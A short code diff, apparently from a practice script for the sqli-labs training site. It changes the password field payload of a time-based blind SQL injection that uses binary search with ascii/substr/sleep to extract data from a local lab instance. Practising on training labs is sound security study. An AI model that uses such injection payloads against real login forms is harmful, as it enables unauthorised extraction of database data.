@@ -19,7 +19,7 @@ def sql_bool():
             mid = (low + high) // 2
             data = {
                 "uname": "1",
-                "passwd": f"1' or if(ascii(substr(({payload}),{i},1))>{mid},sleep(1),0) --+"
+                "passwd": f"1\") or if(ascii(substr(({payload}),{i},1))>{mid},sleep(1),0) --+"
             }
             url = f"http://127.0.0.1:8888/sqli-labs-master/Less-15/"
 
